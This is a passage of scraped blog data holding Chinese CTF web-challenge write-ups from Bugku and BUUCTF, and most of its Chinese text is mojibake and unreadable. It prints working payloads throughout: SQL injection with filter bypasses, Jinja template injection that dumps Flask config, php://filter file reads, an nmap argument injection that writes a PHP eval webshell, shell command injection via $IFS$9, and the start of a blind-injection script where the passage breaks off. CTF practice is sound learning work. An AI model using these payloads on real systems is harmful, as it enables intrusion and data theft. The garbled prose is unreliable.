è¯­çš„ï¼Œå°±æ˜¯è®©æˆ‘ä»¬çŒœå˜›ï¼ŒçŒœå¯¹å°±å¯¹äº†ï¼Œç®—æ˜¯æ”¶è·äº†:ä¸è¦æŠŠæ€ç»´ä»…ä»…å±€é™åœ¨è¿‡å¾€çš„ä»»ä½•ä¸€ä¸ªçŸ¥è¯†ç‚¹ä¸Šï¼Œä»»ä½•åœ°æ–¹å¯èƒ½éƒ½å­˜åœ¨è¿‡æ»¤ï¼Œç„¶åè¿™é¢˜è¿˜æ˜¯ç™½åå•ï¼Œåˆç€å°±æ˜¯è®©æˆ‘ä»¬çŒœphp4== web33å†™è§£å¯†ç®—æ³• web31æ‰«æåå°ï¼Œå¾—åˆ°ä¸€ä¸ªrobots.txtï¼Œæ‰“å¼€åå¾—åˆ° ç„¶åæ‰“å¼€é‚£ä¸ªphp è¯´æˆ‘ä¸æ˜¯ç®¡ç†å‘˜ï¼Œç„¶åä¸‹é¢è¯´è¦get xï¼Œæˆ‘å°±è®©x=adminè¯•è¯•ï¼Œå°±å¯ä»¥äº†ã€‚ã€‚ã€‚è·Ÿå­¦é•¿å°å°åæ§½äº†ä¸€ä¸‹å…¶ä¸­çš„è«åå…¶å¦™åï¼Œå‘ç°æœç„¶è¿˜æ˜¯è‡ªå·±å¤ªå¹´è½»ï¼Œå…¶å®å…¶ä¸­é€»è¾‘æ€§æ¨ç†æ€§è¿˜æŒºå¼ºçš„ï¼Œè¿™é¢˜é¦–å…ˆä»–è¯´ä½ ä¸æ˜¯ç®¡ç†å‘˜ï¼Œç„¶åä¸‹é¢è¯´getçš„x==passwordï¼Œè¿™ä¸ªæ—¶å€™å…¶å®æˆ‘ä»¬ä¼šæƒ³ï¼Œä»€ä¹ˆxä¼šç­‰äºpasswordå•Šï¼Œé¢˜ç›®è¯´æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ï¼Œå°±æ˜¯åœ¨æš—ç¤ºæˆ‘ä»¬passwordå¯èƒ½=adminï¼Œè¿™å…¶å®è€ƒå¯Ÿçš„ä¹Ÿæ˜¯å¼±å¯†ç ï¼Œæ‰€ä»¥ä¹Ÿæ²¡ä»€ä¹ˆåœ°æ–¹å€¼å¾—æ— è¯­çš„ã€‚ web351234567891011121314&lt;?phperror_reporting(0);$KEY='ctf.bugku.com';include_once(&quot;flag.php&quot;);$cookie = $_COOKIE['BUGKU'];if(isset($_GET['25112'])){ show_source(__FILE__);}elseif (unserialize($cookie) === &quot;$KEY&quot;)//è¿™ä¸ªunserializeæ˜¯ååºåˆ—åŒ–{ echo &quot;$flag&quot;;}else {?&gt; åœ¨å°è§’è½æ‰¾åˆ°ä¸€ä¸ª try ?25112ï¼Œå¾—åˆ°ä»¥ä¸Šä»£ç ï¼Œè®©æˆ‘ä»¬ä¸€èµ·åº·åº·ï¼šä»–è¯´å­˜åœ¨flag.phpï¼Œä½†æ˜¯æ‰“å¼€ä»€ä¹ˆä¹Ÿæ²¡æœ‰å†å¾€ä¸‹çœ‹ï¼Œä»–è¯´getä¸€ä¸ªå€¼ï¼Œå°±æ˜¯25112ï¼Œç„¶åå†å°†cookieååºåˆ—åŒ–===keyï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå°±å°†ctf.bugku.comåºåˆ—åŒ–è¯•è¯•å¾—åˆ°s:13:&quot;ctf.bugku.com&quot;;ç„¶åå›åˆ°å¼€å§‹é¡µé¢ï¼ŒburpsuitæŠ“åŒ…ï¼Œè®©cookieé‚£ä¸€æ çš„å€¼ä¸º BUGKU=s:13:â€ctf.bugku.comâ€ å³å¯è¦æˆä¸ºä¸€ä¸ªå¥½çš„ctfer çœ¼ç¥ä¹Ÿæ˜¯è¦å¥½å•Šï¼Œä¸ç„¶è¿™ä¸ª try ?25112çœŸæ»´æ²¡æ‰¾åˆ°","link":"/2021/01/31/bugku3/"},{"title":"buuctf1","text":"Warmâ€”â€”up 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can't see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr(//mb_substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ† $page, 0, mb_strpos($page . '?', '?')//mb_strpos()æŸ¥æ‰¾ string åœ¨ä¸€ä¸ª string ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚ ); //å‡è®¾æˆ‘ä»¬çš„pageæ˜¯123.phpï¼Œæœ€åé€šè¿‡mb_substræˆªå–çš„å†…å®¹å³ä¸º123.php if (in_array($_page, $whitelist)) {//è¿™è¾¹è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒ return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can't see it&quot;; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; æ‰“å¼€hint.phpï¼Œçœ‹åˆ°flagåœ¨ffffllllaaaaggggï¼Œå¦‚ä½•æ‰“å¼€å‘¢ï¼Ÿå°†ä»£ç æ”¾åˆ°phpstormå®¡è®¡ä¸€ä¸‹ï¼š ä»£ç ä¸­æœ‰ä¸€ä¸ªincludeæ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦è®©åˆ¤æ–­è¿›å…¥åˆ°è¿™ä¸ªè¯­å¥å½“ä¸­ï¼Œ æœ¬æ¥ä»¥è¿™é¢˜æ˜¯in_arrayç»•è¿‡ï¼Œä½†æ˜¯å‘ç°ï¼Œin_arrayçš„å¼±ç±»å‹æ¯”è¾ƒä¸­ï¼Œåªæœ‰å½“haystackä¸ºæ•°å­—æ—¶ï¼Œneedleæ‰ä¼šè‡ªåŠ¨è¢«è½¬åŒ–ä¸ºæ•°å­—ï¼Œå®ç°ç»•è¿‡ã€‚ä½†æ˜¯è¿™é‡Œæ¯”è¾ƒçš„å¯¹è±¡ä¸ºå­—ç¬¦ï¼Œå¼±ç±»å‹æ¯”è¾ƒåœ¨è¿™é‡Œå°±è¡Œä¸é€šã€‚å¾€ä¸‹çœ‹ ä½¿ç”¨äº†ä¸€ä¸ªmb_substrçš„å‡½æ•°ï¼ˆç”±äºé…ç½®ä½¿ç”¨mbå‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œæ”¹ä¸ºsubstræ•ˆæœä¸€æ ·ï¼‰ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸‹é¢in_arrayæ¯”è¾ƒçš„å¯¹è±¡å˜æˆæ˜¯ï¼Ÿå‰é¢çš„å†…å®¹ï¼Œç„¶åè¿™é‡Œè¿”å›çš„æ˜¯trueä¸æ˜¯$_pageçš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨?å·åé¢æ‹¼æ¥ä¸€ä¸ªæ–‡ä»¶åå›åˆ°é¢˜ç›®æ‹¼æ¥è¯•è¯•ï¼š è¿™é¢˜å‡ºä¹æ„æ–™çš„æŒºç®€å•çš„ã€‚ã€‚ã€‚åé¢çš„urldecodeå®Œå…¨æ²¡ç”¨åˆ°ã€‚ã€‚ã€‚ ä¸‹ä¸€é¢˜å§ EASYSQLadminâ€™or 1=1#å³å¯ éšä¾¿æ³¨1æœ‰æ³¨å…¥ç‚¹ï¼Œçœ‹äº†ä¸€ä¸‹æºç ï¼Œè¯´sqlmapæ²¡æœ‰çµé­‚â€“ è¯´æ˜å¯ä»¥ç”¨sqlmapæ‰«å‡ºæ¥ï¼Œé‚£å°±ç­‰ä¸€ä¸‹è¿™é‡Œè¿‡æ»¤äº†select æ„å‘³ç€åŸºæœ¬ä¸Šæ‰€æœ‰æ³¨å…¥è¯­å¥éƒ½ç”¨ä¸äº†ï¼Œå°è¯•ä½¿ç”¨å †å æ³¨å…¥ï¼Œï¼ˆå¥½ä¹…æ²¡ç”¨äº†ï¼‰ï¼Œå› ä¸ºå †å æ³¨å…¥å¯ä»¥ä¸ä½¿ç”¨select ç›´æ¥ ç”¨ use showä¹‹ç±»çš„æŒ‡ä»¤æŸ¥äº†ä¸€ä¸‹ï¼Œpayload: 11';use supersqli;show tables; 1';use supersqli;show columns from `1919810931114514`; è¿™é‡Œä¸€å¼€å§‹ç›´æ¥æŸ¥è¯¢æŸ¥è¯¢ä¸å‡ºæ¥ï¼Œçœ‹äº†wpï¼Œå‘ç°éœ€è¦åŠ äº†åå¼•å·ä»¥åæ‰å¯ä»¥æŸ¥è¯¢ï¼Œåœ¨mysqlä¸­å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ª1919810931114514æ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œæ‰€ä»¥éœ€è¦åŠ ``å‚è€ƒ:https://www.cnblogs.com/yangzailu/p/6694000.htmlæ¥ä¸‹æ¥ç»§ç»­å¾€ä¸‹: å‘ç°flagï¼Œå¦‚ä½•æŸ¥è¯¢åˆ—åå‘¢ï¼Ÿï¼š è¿™é‡Œæ‰¾åˆ°ä¸€ç§æ–¹æ³•: 11';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1; è¿™ä¸ªæ–¹æ³•å¾ˆå·§å¦™å•Šï¼Œé¦–å…ˆä½¿ç”¨concatæ‹¼æ¥è¯­å¥ï¼Œè¿™æ ·ç»•è¿‡selectçš„æ£€æŸ¥ï¼Œç„¶å setä¸€ä¸ªï¼ˆè¿™é‡Œå°±å«å˜é‡å§ï¼Œæ¯”è¾ƒå¥½ç†è§£ï¼‰å‚¨å­˜å…¶ä¸­ æ¥ä¸‹æ¥ä½¿ç”¨prepareé¢„å¤„ç† æœ€åä½¿ç”¨executeæ‰§è¡Œå‚è€ƒhttps://www.cnblogs.com/geaozhang/p/9891338.htmlå‚è€ƒï¼šhttps://dev.mysql.com/doc/refman/8.0/en/execute.html 1flag{47b4a012-1ccf-42b7-865d-529d431e6676} Havefun12345$cat=$_GET['cat']; echo $cat; if($cat=='dog'){ echo 'Syc{cat_cat_cat_cat}'; } é¢ç›´æ¥?cat=dogå°±å‡ºæ¥äº†ã€‚ã€‚ã€‚FLAG_TABLE EasySQLä¾æ—§æ˜¯å †å æ³¨å…¥ï¼š 11;show databases; 11;use ctf;show columns; æœ‰ä¸€ä¸ªctfæ¥ä¸‹æ¥ä¸ç®¡ç”¨ä»€ä¹ˆè¯­å¥éƒ½è¿‡ä¸å»äº†ï¼Œäºæ˜¯çœ‹äº†ä¸€ä¸‹wpï¼Œå‘ç°æ˜¯æœ‰æºç çš„ï¼Œä½†æ˜¯æˆ‘æ‰«äº†ä»¥åå‘ç°æ˜¯æ²¡æœ‰å†…å®¹çš„ï¼Ÿäºæ˜¯çœ‹åˆ°æºç ä¸­: 1$sql = &quot;select &quot;.$post['query'].&quot;||flag from Flag&quot;; è¿™é‡Œä½¿ç”¨mysqlè¿›è¡Œæµ‹è¯•ä¸€ä¸‹:è¿™é‡Œçš„||æ˜¯è¡¨ç¤ºæˆ– æ‰€ä»¥æˆ‘ä»¬å…¶å®å¯ä»¥è¿™ä¹ˆçœ‹è¿™ä¸ªè¯­å¥:æˆ‘ä»¬æŸ¥è¯¢FLagè¡¨å†…çš„å†…å®¹å¯ä»¥æ˜¯: 1select * from FLag æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ä¸ªï¼Œè¿›è¡Œåˆ†å‰²è¡¨ç¤ºselectä¸¤æ®µå†…å®¹: å¯ä»¥å‘ç° è¿™é‡Œçš„||å’Œ&&æˆäº†è¿ç®—ç¬¦è¿æ¥äº†æˆ‘ä»¬ä¸éœ€è¦çš„å†…å®¹ï¼Œæ„æˆä¸€ä¸ªæ•´ä½“ä»£å…¥æŸ¥è¯¢å±•ç¤ºï¼š **è§£æ³•äºŒï¼ˆå®˜æ–¹è§£æ³•ï¼‰** æœ‰ä¸€ä¸ªè®¾ç½®ï¼Œå¯ä»¥å°†||ç®¡é“ç¬¦å˜æˆè¿æ¥ç¬¦è€Œä¸æ˜¯è¿ç®—ç¬¦Oracle åœ¨ç¼ºçœæƒ…å†µä¸‹æ”¯æŒä½¿ç”¨ `\" || \"`è¿æ¥å­—ç¬¦ä¸² ï¼Œ **ä½†æ˜¯åœ¨MySQLä¸­ç¼ºçœä¸æ”¯æŒ** ï¼ŒMySQL ç¼ºçœä½¿ç”¨ CONCAT ç³»åˆ—å‡½æ•°æ¥è¿æ¥å­—ç¬¦ä¸² . å¯ä»¥é€šè¿‡ä¿®æ”¹ sql_mode æ¨¡å¼ : PIPES_AS_CONCAT æ¥å®ç°å°† &quot; || &quot;è§†ä¸º å­—ç¬¦ä¸²è¿æ¥ç¬¦ è€Œé æˆ– è¿ç®—ç¬¦ . å› æ­¤è¿™é‡Œé¢„æœŸçš„ Payload æ˜¯é€šè¿‡ä¿®æ”¹ sql_mode æ¥æ‹¿åˆ° Flag ï¼Œå¦‚ä¸‹ Payload : 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 æ‹¼æ¥åå°±å˜æˆäº† SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag include1æ–‡ä»¶åŒ…å«+å°è£…åè®®ï¼Œä¹‹å‰å†™è¿‡äº†: 1php://filter/read=convert.base64-encode/resource=flag.php Secret File1 1234567891011&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt; ä¾æ—§ä½¿ç”¨php://filterå°è£…åè®®ã€‚ã€‚ã€‚ã€‚ 1php://filter/read=convert.base64-encode/resource=flag.php","link":"/2021/03/15/buuctf/"},{"title":"buuctf10","text":"[WesternCTF2018]shrine 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) python sstiæ³¨å…¥ è¿‡æ»¤()è¿˜æœ‰configä»¥åŠselfï¼Œç”±äºè¿‡æ»¤äº†æ‹¬å·ï¼Œæ‰€ä»¥åˆšå­¦çš„è®¾ç½®å˜é‡çš„æ–¹æ³•åœ¨è¿™é‡Œå°±ä¸èƒ½ä½¿ç”¨äº†ï¼Œçœ‹ä¸€ä¸‹åˆ«äººwpçš„æ€è·¯å§:app.config[â€˜FLAGâ€™] = os.environ.pop(â€˜FLAGâ€™) é¦–å…ˆè¿™é‡Œè¯´flagåœ¨configè¿™ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œé‚£ä¹ˆå¦‚ä½•æŸ¥çœ‹è¿™ä¸ªå˜é‡å‘¢ï¼Ÿè¿™é‡Œä»‹ç»ä¸¤ä¸ªå‡½æ•°:url_forå’Œget_flashed_messageé€šè¿‡è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œæ¥æŸ¥è¯¢ç°åœ¨appå†…çš„å…¨å±€å˜é‡ã€‚(get_flashed_messageså‡½æ•°è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡flash()ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨get_flashed_messages()æ–¹æ³•å–å‡ºï¼Œé—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©ºã€‚) __globals__ function.__globals__ï¼Œç”¨äºè·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚è¯¥å±æ€§æ˜¯å‡½æ•°ç‰¹æœ‰çš„å±æ€§,è®°å½•å½“å‰æ–‡ä»¶å…¨å±€å˜é‡çš„å€¼,å¦‚æœæŸä¸ªæ–‡ä»¶è°ƒç”¨äº†osã€sysç­‰åº“,ä½†æˆ‘ä»¬åªèƒ½è®¿é—®è¯¥æ–‡ä»¶æŸä¸ªå‡½æ•°æˆ–è€…æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨globalså±æ€§è®¿é—®å…¨å±€çš„å˜é‡ã€‚è¯¥å±æ€§ä¿å­˜çš„æ˜¯å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ã€‚ æœ‰äº†è¿™ä¸¤ä¸ªçŸ¥è¯†ç‚¹ æˆ‘ä»¬å°±å¯ä»¥æ„é€ payload: 123{{get_flashed_message.__globals__.}}//'current_app': &lt;Flask 'app'&gt;,{{get_flashed_message.__globals__['current_app'].config}}{{url_for.__globals__['current_app'].config}} éœ€è¦æ³¨æ„çš„æ˜¯ å½“ä½ ä½¿ç”¨äº†get_flashed_messageä»¥å æŸ¥è¯¢å‡ºä¸€æ¬¡å°†ä¸ä¼šå†æŸ¥è¯¢å‡ºç¬¬äºŒæ¬¡äº† æ€è·¯å°ç»“:æŸ¥çœ‹æºç ï¼Œå‘ç°flagåœ¨appçš„configçš„é…ç½®æ–‡ä»¶ä¸­â€”â€”æ€è€ƒå¦‚ä½•åœ¨()è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹è·å–flagå˜é‡â€”â€”globalså¯ä»¥è·å¾—æ‰€æœ‰å˜é‡â€”â€”å¦‚ä½•è¯»å–ï¼Ÿâ€”â€”å¯»æ‰¾å¯è¯»å–å˜é‡çš„å‡½æ•°ã€‚ [SWPU2019]Web1 å­˜åœ¨sqlæ³¨å…¥ ä¸è¿‡æ˜¯MariaDBæ•°æ®åº“è€Œä¸æ˜¯mysqlæ•°æ®åº“ï¼Œæµ‹è¯•äº†ä¸€ä¸‹å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ ä½¿ç”¨/**/è¿›è¡Œç»•è¿‡ å¹¶ä¸”union selectæ²¡è¢«è¿‡æ»¤æ‰€ä»¥ä½¿ç”¨è”åˆæ³¨å…¥: 1-1'union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 1-1'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 æŸ¥è¯¢å¾—åˆ°æ•°æ®åº“å ç”±äºorè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œå­¦ä¹ ä¸€ä¸‹ æŸ¥è¯¢è¡¨çš„åº“æ€»ç»“åœ¨information_schemaä¸­ï¼Œé™¤äº†SCHEMATAï¼ŒTABLESï¼ŒCOLUMNSæœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„mysqlä¸­ï¼Œè¿˜æœ‰INNODB_TABLESåŠINNODB_COLUMNSã€sys.schema_auto_increment_columnsã€mysel.innodb_table_statsè®°å½•ç€è¡¨ç»“æ„ æœ¬é¢˜æŸ¥è¯¢è¡¨çš„payload: 1-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 ads,users æ— åˆ—åæ³¨å…¥: PS:ä¸ºå•¥åé¢æœ‰ä¸ªaå‘¢ï¼Ÿå› ä¸ºï¼Œè¿›è¡ŒåµŒå¥—æŸ¥è¯¢çš„æ—¶å€™å­æŸ¥è¯¢å‡ºæ¥çš„çš„ç»“æœæ˜¯ä½œä¸ºä¸€ä¸ªæ´¾ç”Ÿè¡¨æ¥è¿›è¡Œä¸Šä¸€çº§çš„æŸ¥è¯¢çš„ï¼Œæ‰€ä»¥å­æŸ¥è¯¢çš„ç»“æœå¿…é¡»è¦æœ‰ä¸€ä¸ªåˆ«å æŠŠMySQLè¯­å¥æ”¹æˆï¼šselect * from (select * from â€¦â€¦) as åˆ«å; aså¯ä»¥çœç•¥:æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å°±å¯è¿›è¡Œæ— åˆ—æ˜æ³¨å…¥äº†:æœ¬é¢˜payload: 1-1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 2,flag,admin,admin1 1-1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 1-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 è¿™é‡Œæˆ‘ä»¬æ˜¯å®šä¹‰äº†è¡¨ä¸ºb å¹¶ä¸”å°†åé¢çš„æŸ¥è¯¢åˆ°çš„æ•°æ®æš‚æ—¶å­˜å…¥è¯¥è¡¨ä¸­ [WUSTCTF2020]æœ´å®æ— årobots.txté‡Œé¢å‘ç°ä¸€ä¸ªfakeflagï¼Œç„¶åæ‰“å¼€åŒ…å‘ç°fl4g.phpæ‰“å¼€å‘ç°æºç Look_at_me: /fl4g.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){ echo &quot;é´æˆœç¬‰ç¼å¿”å‰°é—‚å¯¸æ¹…æµœå—™æ¹…é´æˆ æ®‘é”å†²å§æ¾¹ï¿½, æ¶“å¶†æ§¸é¯å´‡æ¹…éƒå •æ£¿, é™î…æ§¸é¯å……ç¬‰ç¼å¿”å‰°é—‚ï¿½, ç’â•€ç¶˜é­ãƒ©äº¾é´æˆ£ç¹ƒå¯°æ¥ç˜®æµ£çŠ²ã‚½.&lt;/br&gt;&quot;; }else{ die(&quot;é–²æˆ¦æŒ¶ç‘™ï½…å–…æ¶“å¶„ç°¡ç»Œèœ‚æ±‰é¨å‹¬æ¹°ç’ã„©æ£¶æ£°ï¿½&quot;); }}else{ die(&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;);}//level 2if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo &quot;é¯å†²åŸŒæ©æ¬é‡œCTFeré·å®åŸŒflagéšï¿½, é°ç†¸ç¸ºå¨‘æ›¢æµ‚, ç’ºæˆå¹“æ¶“æ»„ç·¶å®€ï¿½, éµå¥ç«´ç€¹å •î˜µé˜ï¿½, é¶å©‚å¸¹ç”¯å £æ¡¨é‘å“„å¹“, é‘·î„ç¹éæè¢±æ¶“î…å¬éµå¬ªçš¬é‘¿ï¿½, éŠæç«´é‰îˆ›æšç‘å‘¯æ«§é–°ï¿½, é‘·æ‘ç˜œéˆå¤äº¾, é’î‚¢î„Ÿçå¿”æ¯š.&lt;/br&gt;&quot;; else die(&quot;é´æˆ£åˆ€ç»±Ñƒæˆé‰ãƒ¦åœé¨å‹¯å­é‘²å¤‹æ¹…é™ï¿½, æµ æ ¨å¢¦æµœå—•é‡œé¢ä½ƒç˜½, é¶å©ç²¬æ¶“â‚¬ç€¹è·ºç•¨éºæ‘åŸŒæµœå—›æ½ªå¨²ï¿½&quot;);}else{ die(&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;);}//get flagif (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,&quot; &quot;)){ $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;é¯å†²åŸŒæ©æ¬“å™·, é´æˆå–ç€¹ç‚¶â‚¬å±¾î‚¾é±ï¿½, éˆå¤æŒ¶æµœè™¹æ®‘è¹‡î‚¡ç®°å¯°â‚¬å¯°â‚¬çè¾¨æ§¸æ©æ¬ç®é¨å‹¬æ¹¸ç€¹ç‚´æ£¤é—ï¿½, æ¶“æ—€çŸé•ï¿½.&lt;/br&gt;&quot;; system($get_flag); }else{ die(&quot;è¹‡î‚¢åŸŒé—ˆç‚´åºŠæµœï¿½&quot;); }}else{ die(&quot;é˜å©šæ½ªå¨²æ’æƒ‚&quot;);}?&gt; 1fl4g.php?num=0x1234&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag ä¸èƒ½ä½¿ç”¨catï¼Œç”¨moreä»£æ›¿ ä¸èƒ½ä½¿ç”¨ç©ºæ ¼ï¼Œå¯ä»¥ç”¨ä¹‹å‰ç”¨åˆ°çš„$IFS$9ä»£æ›¿ å…ˆä½¿ç”¨lså‘½ä»¤æŸ¥åˆ°flagçš„ä½ç½® ä¼—æ‰€å‘¨çŸ¥linuxä¸­å‘½ä»¤catã€moreã€lesså‡å¯ç”¨æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œä¸»è¦åŒºåˆ«æœ‰ï¼šæ–°å­¦çš„çŸ¥è¯†ç‚¹catæ˜¯ä¸€æ¬¡æ€§æ˜¾ç¤ºæ•´ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œè¿˜å¯ä»¥å°†å¤šä¸ªæ–‡ä»¶è¿æ¥èµ·æ¥æ˜¾ç¤ºï¼Œå®ƒå¸¸ä¸é‡å®šå‘ç¬¦å·é…åˆä½¿ç”¨ï¼Œé€‚ç”¨äºæ–‡ä»¶å†…å®¹å°‘çš„æƒ…å†µï¼›moreå’Œlessä¸€èˆ¬ç”¨äºæ˜¾ç¤ºæ–‡ä»¶å†…å®¹è¶…è¿‡ä¸€å±çš„å†…å®¹ï¼Œå¹¶ä¸”æä¾›ç¿»é¡µçš„åŠŸèƒ½ã€‚moreæ¯”catå¼ºå¤§ï¼Œæä¾›åˆ†é¡µæ˜¾ç¤ºçš„åŠŸèƒ½ï¼Œlessæ¯”moreæ›´å¼ºå¤§ï¼Œæä¾›ç¿»é¡µï¼Œè·³è½¬ï¼ŒæŸ¥æ‰¾ç­‰å‘½ä»¤ã€‚è€Œä¸”moreå’Œlesséƒ½æ”¯æŒï¼šç”¨ç©ºæ ¼æ˜¾ç¤ºä¸‹ä¸€é¡µï¼ŒæŒ‰é”®bæ˜¾ç¤ºä¸Šä¸€é¡µã€‚ä¸‹é¢è¯¦ç»†ä»‹ç»è¿™3ä¸ªå‘½ä»¤ã€‚https://blog.csdn.net/xyw_blog/article/details/16861681","link":"/2021/04/15/buuctf10/"},{"title":"buuctf11","text":"[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmapæœ¬é¢˜åº”è¯¥è€ƒå¯Ÿnmapçš„æŒ‡ä»¤å‚æ•°æ³¨å…¥ï¼Œè®°å¾—ä¹‹å‰æœ‰åšä¸ªç±»ä¼¼çš„é¢˜ç›®: 123host='&lt;?=eval($_GET[a]);?&gt; -oN flag.phtml '' -iL /flag -oN flag.txt ' [MRCTF2020]PYWebsiteæºç æœ‰ä¸ª/flag.php ç„¶åç‚¹è¿›å»çœ‹åˆ°è¯´ä»€ä¹ˆä¿å­˜äº†è´­ä¹°è€…çš„ipï¼Œå¦‚æœæ˜¯è´­ä¹°è€…æ‰èƒ½ä¹°ï¼Œé‚£å°±ä¼ªé€ ä¸€ä¸‹IPï¼Œpayloadï¼š 1X-Forwarded-For: 127.0.0.1 [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQLç›²æ³¨^ç¬¦å·è¿›è¡Œç»•è¿‡å­¦ä¹ ä¸€ä¸‹äºŒåˆ†æ³•è¿›è¡Œç›²æ³¨ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ç½‘ä¸Šå¤§ç¥çš„è„šæœ¬äº†: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import reimport requestsimport stringurl = &quot;http://bdd17c66-2f39-4c33-849e-abc1d04f19f2.node3.buuoj.cn/search.php&quot;flag = ''def payload(i, j): # æ•°æ®åº“åå­— #sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j) # è¡¨å # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1&quot;%(i,j) # åˆ—å # sql = 